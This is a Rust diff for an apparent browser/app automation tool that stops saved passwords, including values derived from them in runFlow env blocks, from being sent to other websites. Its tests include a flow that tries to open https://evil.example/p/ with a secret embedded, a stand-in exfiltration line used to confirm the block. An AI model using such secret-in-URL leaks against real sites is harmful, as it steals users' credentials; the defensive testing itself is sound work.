@@ -553,8 +553,10 @@ async fn start_session(
     let driver = launcher.launch(platform, device).await.inspect_err(|_| crate::claim::release(id))?;
     let mut done = None;
     if let Some(t) = target {
+        // Security #237 M1: by name too, so a short password in a session's address is held.
+        let named = crate::dsl::names_app_secret(t);
         let t = substitute(t).map_err(Error::Flow)?;
-        if crate::dsl::holds_app_secret(&t) {
+        if named || crate::dsl::holds_app_secret(&t) {
             let at = (platform == Platform::Web).then_some(t.as_str());
             crate::secrets::allowed_at(at, platform).map_err(Error::Flow)?;
         }
@@ -1250,7 +1252,12 @@ fn exec_with<'a>(d: &'a dyn Driver, step: &'a Step, ctx: &'a Ctx, confirmed: boo
                     return Ok(Some(format!("skipped ({c} is false)")));
                 }
                 for (k, v) in env {
+                    // Security #237 M1: a value made from a saved password stays on its site too.
+                    let held = holds_app_secret(ctx, v);
                     let v = subst(v)?;
+                    if held {
+                        crate::dsl::keep_app_value(&v);
+                    }
                     guard(&ctx.vars).insert(k.clone(), v);
                 }
                 block(d, steps, ctx).await?;
@@ -2259,6 +2266,12 @@ mod tests {
         };
         let step = crate::dsl::parse_flow("- openUrl: \"https://evil.example/p/${COPY}\"\n").expect("flow").steps.remove(0).step;
         assert!(exec_with(&web, &step, &ctx, false).await.is_err_and(|e| e.to_string().contains("only used on its own website")), "a copy");
+        // A value made from it in a runFlow env (`${SHOP_PIN}x`) is held the same way.
+        let flow = "- runFlow:\n    env:\n      MADE: \"${SHOP_PIN}x\"\n    commands:\n      - openUrl: \"https://evil.example/p/${MADE}\"\n";
+        let step = crate::dsl::parse_flow(flow).expect("flow").steps.remove(0).step;
+        let e = exec_with(&web, &step, &ctx, false).await;
+        let refused = format!("{e:?} {:?}", guard(&ctx.records).iter().map(|r| r.error.as_ref().map(ToString::to_string)).collect::<Vec<_>>());
+        assert!(refused.contains("only used on its own website"), "a made value: {refused}");
         assert!(web.calls.lock().unwrap_or_else(|p| p.into_inner()).iter().all(|c| !c.contains("evil")), "nothing opened");
         crate::secrets::set_scope(None);
         // SAFETY: as above.
